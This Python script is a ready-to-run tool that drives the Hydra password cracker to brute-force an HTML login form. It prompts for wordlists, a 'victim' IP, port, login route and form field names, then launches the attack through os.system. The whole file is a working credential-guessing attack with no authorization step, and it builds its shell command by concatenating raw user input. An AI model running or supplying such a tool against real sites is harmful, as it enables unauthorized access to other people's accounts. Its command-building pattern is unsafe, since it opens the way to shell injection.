import sys
import subprocess
from os import system
import re
from time import sleep
from tqdm import tqdm

class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    FAIL = '\033[91m' #RED
    RESET = '\033[0m' #RESET COLOR


hydra_v = subprocess.getoutput("hydra --version")

print(f'''{bcolors.FAIL}\n
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=   Brute Force HTML form (HYDRA) by h19  =
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
\n
{bcolors.RESET}''')

def loader():
    with tqdm(total=100, desc="Processing", bar_format="{l_bar}{bar} [ time left: {remaining} ]") as pbar:
        for i in range(100):
            sleep(0.02)
            pbar.update(1)

def installer(option):
    if option == "y" or option == "yes":
        system('sudo apt-get install hydra -y')
        start()

        print('*** Exit of program ***')
    elif option == 'q' or option == 'quit':
        print(f'{bcolors.FAIL}\n*** Exit of program ***\n{bcolors.RESET}')
        exit()
    else:
        print('[x] Invalid option')
        installerSelector()

def installerSelector():
    option = input('You want to install hydra yes or y / quit or q ? ' )
    installer(option)
results = []
def checkValues(val, entry):
    if val != "" and val != " ":
        print(f'{bcolors.OK}[v]{bcolors.RESET} ' ,entry,':', val)
        results.append(1)
    elif val == "" or val == " ":
        print(f'{bcolors.FAIL}[x]{bcolors.RESET} ' ,entry,': !Not found')
        
def init():
    try:
        print('--- Starting interactive console ---\n')
        
        user_list = input('Enter the path of your username dictionary => ' )
        passwd_list = input("Enter the path of your passwords dictionary => ")
        port = input('Enter the port of the remote server => ')
        ip = input ("Enter the IP Victim of the remote server => " )
        route = input("Enter the path to execute the attack ex: /login => ")
        fieldNameOne = input("Enter the name of the username input of the HTML form => ")
        fieldNameTwo = input("Enter the name of the password input of the HTML form => ")
        message = input("Please enter an error message => ")

        print(f'\n{bcolors.FAIL}{"="*40}{bcolors.RESET}')
        
        user_list = re.sub(r"\s+", "", user_list)
        passwd_list = re.sub(r"\s+", "", passwd_list)
        port = re.sub(r"\s+", "", port)
        ip = re.sub(r"\s+", "", ip)
        route = re.sub(r"\s+", "", route)
        fieldNameOne = re.sub(r"\s+", "", fieldNameOne)
        fieldNameTwo = re.sub(r"\s+", "", fieldNameTwo)
        message = re.sub(r"\s+", "", message)

        checkValues(user_list, "Username wordlist")
        checkValues(passwd_list, "Password wordlist")
        checkValues(port, "Port Victim")
        checkValues(ip, "IP Victim")
        checkValues(route, "Route to attack")
        checkValues(fieldNameOne, "Field name one")
        checkValues(fieldNameTwo, "Field name two")
        checkValues(message, "Message")
        
        if len(results) == 8:
            print('\n=-=-=-=-= Starting Attack =-=-=-=-=-=-=\n')
            loader()
            system("hydra -t 4 -V -f -L"+" "+user_list+" -s "+port+' -P '+passwd_list+" "+ip+" http-post-form "+'"'+route+':'+fieldNameOne+'=^USER^&'+fieldNameTwo+'=^PASS^&Login=Login:'+message+'"')            
        else:
            print(f'{bcolors.FAIL}{"="*40}{bcolors.RESET}')
            print(f'\n{bcolors.FAIL}!Data entry error{bcolors.RESET}')
            print(f'{bcolors.FAIL}Unable to launch attack{bcolors.RESET}\n')
            print(f'{bcolors.FAIL}{"="*40}{bcolors.RESET}\n')

    except:
        print(f"{bcolors.FAIL}An error has ocurred{bcolors.RESET}")

def start():
    if "not found" in hydra_v:
        print(f"{bcolors.WARNING}[x] Hydra not found in your system")
        print(f"{bcolors.WARNING}Install hydra{bcolors.RESET}")
        installerSelector()
    else:
        print(f"{bcolors.OK}[v] Hydra found")
        init()
start()
